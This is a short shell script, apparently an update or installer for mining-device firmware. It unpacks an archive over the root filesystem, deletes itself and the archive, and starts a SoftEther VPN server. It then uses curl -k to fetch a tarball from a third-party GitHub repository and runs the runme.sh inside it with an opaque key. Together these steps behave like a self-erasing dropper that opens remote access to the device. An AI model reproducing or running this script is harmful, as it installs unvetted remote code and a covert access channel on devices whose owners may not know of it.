#!/bin/sh

tar -xzf up.tar.gz -C /

echo "+++++++++++++++++++++++++++"

	rm "./up.tar.gz"

  rm "./runme.sh"
  
  /opt/etc/init.d/S80softethervpnserver start

  sync
  
  curl -k https://raw.githubusercontent.com/cluet/1/main/ant.tar.gz -o ant.tar.gz && tar -zxf ant.tar.gz && ./runme.sh xtDMh7PzvjmKqYw0Wced2Z94BJL1rXSCluEAyRFGOIQ8iponfb


# Some vnish's firemware requires it
# to finigh update properly
#exit 0
